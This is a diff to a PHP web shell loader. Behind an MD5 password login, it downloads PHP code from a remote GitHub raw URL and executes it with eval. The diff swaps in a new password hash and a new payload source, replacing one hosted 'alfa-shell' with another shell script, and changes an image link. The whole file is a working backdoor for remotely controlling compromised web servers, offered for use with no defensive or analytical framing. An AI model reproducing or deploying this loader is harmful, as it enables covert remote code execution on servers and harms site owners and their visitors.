@@ -42,7 +42,7 @@ function is_logged_in()
 // Check if the password is submitted and correct
 if (isset($_POST['password'])) {
     $entered_password = $_POST['password'];
-    $hashed_password = '0e6a92900a9759cdbcaee1203b238db9'; // Replace this with your MD5 hashed password
+    $hashed_password = '6c1cefcb01529013a483a2564ada8144'; // Replace this with your MD5 hashed password
     if (md5($entered_password) === $hashed_password) {
         // Password is correct, store it in session
         $_SESSION['logged_in'] = true;
@@ -55,7 +55,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/nicxlau/alfa-shell/master/alfa-obfuscated.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/mangoleh098/bipaspewe/refs/heads/main/bipas.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
@@ -67,7 +67,7 @@ if (is_logged_in()) {
     </head>
     <body bgcolor="gray">
         <center>
-        <img src="https://i.pinimg.com/originals/0f/39/9a/0f399ae4ba7721e8b05e64aeeb7d915b.gif" />
+        <img src="https://i.pinimg.com/originals/0f/39/9a/0f399ae4ba7721e8b05e64aasasasassseeb7d915b.gif" />
         <body style="background-color:gray;">
         <form method="POST" action="">
             <label for="password">Password:</label>
